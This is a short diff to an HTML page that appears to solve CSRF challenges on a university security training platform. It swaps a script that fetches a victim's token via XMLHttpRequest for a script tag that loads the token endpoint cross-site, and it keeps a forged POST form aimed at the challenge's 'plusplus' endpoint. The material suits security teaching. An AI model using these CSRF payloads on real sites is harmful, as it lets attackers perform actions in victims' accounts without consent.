@@ -13,15 +13,8 @@ body {font-family: "Lato", sans-serif}
 <body>
 
 <!-- Form for CSRF attack 2-->  
-<script>
-  var xhr = new XMLHttpRequest();
-  xhr.open('GET', "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e", false);
-  xhr.send();
-
-  if(xhr.readyState == 4 && xhr.status == 200) {
-    var res = JSON.parse(xhr.responseText);
-    print(res)
-  }
+<script type="application/javascript"
+        src="https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e">
 </script>
 
 <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="POST">
